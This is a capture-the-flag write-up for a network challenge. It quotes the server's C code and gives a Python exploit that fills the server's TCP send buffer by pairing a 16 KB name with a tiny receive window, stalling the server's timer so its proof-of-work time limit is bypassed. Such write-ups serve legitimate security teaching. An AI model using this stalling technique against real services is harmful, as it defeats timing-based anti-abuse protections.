# Supercomputer required

|         |                            |
| ------- | -------------------------- |
| Authors | Davide Gianessi <@gianetz> |
| Points  | 500                        |
| Tags    | misc,network               |

## Challenge Description

Join the most exclusive club ever, benefits include a free flag!

This is a remote challenge, you can connect with:

`nc ada.challs.ulisse.ovh 5533`

## Overview

This challenge asks you to solve a proof of work in an very low timeframe, in order to get into the supercomputer-owner club and get your flag.

## Source Code Analysis

Immediately we can notice that you have 0.01 seconds of time, inclusive of network delays, which means we are not going to make it in time the by following the rules, let's see how we can cheat the timer then.

```c
  if (send(cd, response, strlen(response), 0) < strlen(response))
    break;
  if (send(cd, challenge_hex, 2 * CHALLENGE_SIZE, 0) <
      2 * CHALLENGE_SIZE)
    break;
  response = " in less than one second to prove you have a "
             "supercomputer and elevetate the status of user ";
  if (send(cd, response, strlen(response), 0) < strlen(response))
    break;
  if (send(cd,name,strlen(name),0)<strlen(name))
    break;
  response = ":\n";
  if (send(cd, response, strlen(response), 0) < strlen(response))
    break;

  long start_time = get_time_ms();

  char nonce_hex[2 * CHALLENGE_SIZE + 1];
  if (recv(cd, nonce_hex, 2 * CHALLENGE_SIZE + 1, 0) < 0)
    break;

  long end_time = get_time_ms();
  if (end_time - start_time > 10) {
    response = "too slow\n";
    if (send(cd, response, strlen(response), 0) < strlen(response))
      break;
    continue;
  }
```

This is the piece we are interested in, we can see that before starting the timer, the server does a bunch of sends,
send calls will be blocking if the tcp send buffer is full and will wait until it frees some space,
if we can keep it filled, we can calculate the POW without worring about time limits

the send buffer size is determined by the SO_SNDBUF option:

```c
int sndbuf= 4096;
socklen_t optlen = sizeof(sndbuf);
if( setsockopt(cd, SOL_SOCKET, SO_SNDBUF, &sndbuf, optlen) == -1){
  close(cd);
  continue;
}
```

in this case it is set to 4kb, and the name, which we can control, is up to 16kb
so, once we choose a 16kb name, and succesfully filled up the buffer the only thing left to do is to keep it full.
One way to do that is by reducing the size of your tcp window to very small values and not do any recv() so that is going to be full too
then we can calculate the POW and send it, after we do that we can start consuming all of the data that the service is sending to unblock it and it will start the timer and end it immediately seeing a 0 time difference and give you the flag

script:

```py
import hashlib
import sys
import socket
import re
import os

HOST = "ada.challs.ulisse.ovh"
PORT = 5533
CHALLENGE_SIZE = 32
DIFFICULTY = 24

def sha256(data):
    return hashlib.sha256(data).digest()

def validate_pow(challenge, nonce):
    data = challenge + nonce
    hash_value = sha256(data)
    for i in range(DIFFICULTY):
        if hash_value[i // 8] & (1 << (7 - (i % 8))) != 0:
            return False
    return True

def solve_pow(challenge, start_nonce=0, step=1):
    nonce = start_nonce
    while True:
        nonce_bytes = nonce.to_bytes(CHALLENGE_SIZE, byteorder='big')
        if validate_pow(challenge, nonce_bytes):
            return nonce_bytes.hex()
        nonce += step


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 256) #set a low window size
s.connect((HOST, PORT))

print(s.recv(1024))
s.sendall(b"A"*(2**14-1)+b"\n") #choose a long name
print(s.recv(1024))

s.send(b"2\n")
print("Sent: 2")
challenge=s.recv(256).decode()
challenge = re.search(r'\b[a-f0-9]{64}\b', challenge).group(0)
print(challenge)

challenge = bytes.fromhex(challenge)
proof = solve_pow(challenge)
print(proof)

s.send(proof.encode()+b"\n")

s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 100000)

s.send(b"3\n")
print("Sent: 3")

while True:
    rec=s.recv(10000).decode()
    if("UlisseCTF" in rec):
        flag = rec + s.recv(10000).decode()
        flag=re.search(r'UlisseCTF\{.*?\}', flag).group(0)

        print(flag)
        s.close()
        exit()
```

A couple things to be aware of, window sizes have limits to how big or small they can be set by the kernel, in this case we set it to 256, but if we do s.getsocketop(socket.SOL_SOCKET,socket.SO_SNDBUF), we will recieve a larger number, like 2kb, this is not an issue because it will fill up either way and we have margin.
Also i am setting the size before starting the connection, because sometimes the kernel ignores the limits for optimization purposes, like if it sees that the other peer has a large recieve window
